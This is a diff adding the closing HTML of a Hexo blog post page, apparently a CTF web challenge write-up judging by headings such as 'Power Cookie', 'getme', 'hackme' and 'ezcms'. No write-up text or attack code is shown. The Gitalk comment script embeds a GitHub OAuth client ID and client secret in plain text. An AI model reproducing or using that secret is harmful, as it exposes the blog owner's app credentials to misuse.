+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script 
+                src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initGitalk = () => {
+            let gitalkPathname = decodeURI(location.pathname)
+            const gitalkPathnameLength = gitalkPathname.length
+            const gitalkPathnameMaxLength = 50
+            if (gitalkPathnameLength > gitalkPathnameMaxLength) {
+              gitalkPathname = gitalkPathname.substring(0, gitalkPathnameMaxLength - 3) + '...'
+            }
+
+            if (window?.Gitalk) {
+              new Gitalk({
+                clientID: 'Ov23liQm7PTQpK5JLa0h',
+                clientSecret: 'ba0525d7d59a301a09ac76ed9299df6ceb9a42a5',
+                repo: 'gitalk',
+                owner: 'ohvy',
+                admin: 'ohvy',
+                id: gitalkPathname,
+                proxy: '',
+                language: 'zh-CN'
+              }).render('gitalk-container')
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initGitalk()
+              }, 1000)
+            }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGitalk()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initGitalk)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Power-Cookie"><span class="nav-text">Power Cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AD%94%E6%B3%95%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="nav-text">魔法浏览器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#getme"><span class="nav-text">getme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackme"><span class="nav-text">hackme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezcms"><span class="nav-text">ezcms</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Latte</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Power-Cookie"><span class="nav-text">Power Cookie</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AD%94%E6%B3%95%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="nav-text">魔法浏览器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#getme"><span class="nav-text">getme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackme"><span class="nav-text">hackme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezcms"><span class="nav-text">ezcms</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/lazyload.min.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/js/post/share.min.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
